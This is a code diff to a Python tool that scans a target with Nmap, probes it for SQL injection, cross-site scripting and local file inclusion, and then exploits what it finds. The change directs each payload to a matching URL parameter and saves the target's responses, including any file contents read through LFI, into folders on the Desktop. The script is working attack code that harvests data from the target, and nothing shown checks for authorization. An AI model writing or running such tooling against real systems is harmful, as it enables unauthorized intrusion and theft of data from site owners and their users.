@@ -13,6 +13,16 @@ scan_results = []
 # File path for vulnerability report
 desktop_path = os.path.join(os.path.expanduser("~"), "Desktop", "vulnerability_report.txt")
 
+# Create folders on the desktop to store found files
+lfi_folder_path = os.path.join(os.path.expanduser("~"), "Desktop", "LFI")
+os.makedirs(lfi_folder_path, exist_ok=True)
+
+xss_folder_path = os.path.join(os.path.expanduser("~"), "Desktop", "XSS")
+os.makedirs(xss_folder_path, exist_ok=True)
+
+sql_folder_path = os.path.join(os.path.expanduser("~"), "Desktop", "SQL_Injection")
+os.makedirs(sql_folder_path, exist_ok=True)
+
 # Network Scanning using Nmap (all ports)
 def network_scan(target):
     print(f"Starting network scan on {target}...")
@@ -30,7 +40,6 @@ def network_scan(target):
     scan_results.append({'type': 'network', 'data': result})
     print(f"Network scan results: {result}")
     return result
-
 
 # Web Vulnerability Scanner with multiple payloads
 def check_sql_injection(url):
@@ -108,7 +117,6 @@ def check_sql_injection(url):
             print(f"Error checking SQL Injection: {e}")
     return vulnerable_payloads
 
-
 def check_xss(url):
     xss_payloads = [
         "<script>alert('xss')</script>",
@@ -158,7 +166,6 @@ def check_xss(url):
         except Exception as e:
             print(f"Error checking XSS: {e}")
     return vulnerable_payloads
-
 
 def check_lfi(url):
     lfi_payloads = [
@@ -234,7 +241,6 @@ def check_lfi(url):
             print(f"Error checking LFI: {e}")
     return vulnerable_payloads
 
-
 # Function to run web scan
 def run_web_scan(target_url):
     print(f"Running web vulnerability scan on {target_url}...")
@@ -269,17 +275,37 @@ def run_web_scan(target_url):
     print(f"Vulnerability report written to {desktop_path}")
     return vulnerabilities
 
+# Function to run exploitation for found vulnerabilities
+def run_exploitation(target_url, payloads, vulnerability_type):
+    # Define the output directory based on vulnerability type
+    if vulnerability_type == "LFI":
+        directory = lfi_folder_path
+        url_param = "file"
+    elif vulnerability_type == "SQL Injection":
+        directory = sql_folder_path
+        url_param = "id"  # Assuming SQL injection is on the id parameter
+    elif vulnerability_type == "XSS":
+        directory = xss_folder_path
+        url_param = "input"
 
-# Exploitation using HTTP requests
-def run_exploitation(target_url, payloads):
     for payload in payloads:
         try:
-            exploit_url = f"{target_url}?id={payload}"  # Adjust this based on the vulnerability type
+            exploit_url = f"{target_url}?{url_param}={payload}"  # Construct the URL based on the payload type
             response = requests.get(exploit_url, verify=False)
 
             if response.status_code == 200:
                 print(f"Exploit executed successfully with payload: {payload}")
-                print(f"Response: {response.text}")
+                print(f"Status code: {response.status_code}")
+
+                # Create a filename based on the payload to store the content
+                sanitized_payload = payload.replace("/", "_").replace("..", "dotdot").replace(" ", "_")
+                file_path = os.path.join(directory, f"{vulnerability_type.lower()}_payload_{sanitized_payload}.txt")
+
+                # Write the content to a file
+                with open(file_path, 'w', encoding='utf-8') as file:
+                    file.write(response.text)  # Save the file content
+
+                print(f"Data from {vulnerability_type} payload saved to {file_path}")
             else:
                 print(f"Exploit returned status code: {response.status_code}")
         except Exception as e:
@@ -306,10 +332,13 @@ def main():
 
     # Run exploitation for found vulnerabilities
     if web_vulnerabilities['SQL Injection']:
-        run_exploitation(target_url, web_vulnerabilities['SQL Injection'])
+        run_exploitation(target_url, web_vulnerabilities['SQL Injection'], "SQL Injection")
+
+    if web_vulnerabilities['Cross-Site Scripting (XSS)']:
+        run_exploitation(target_url, web_vulnerabilities['Cross-Site Scripting (XSS)'], "XSS")
 
     if web_vulnerabilities['Local File Inclusion (LFI)']:
-        run_exploitation(target_url, web_vulnerabilities['Local File Inclusion (LFI)'])
+        run_exploitation(target_url, web_vulnerabilities['Local File Inclusion (LFI)'], "LFI")
 
 if __name__ == '__main__':
     main()
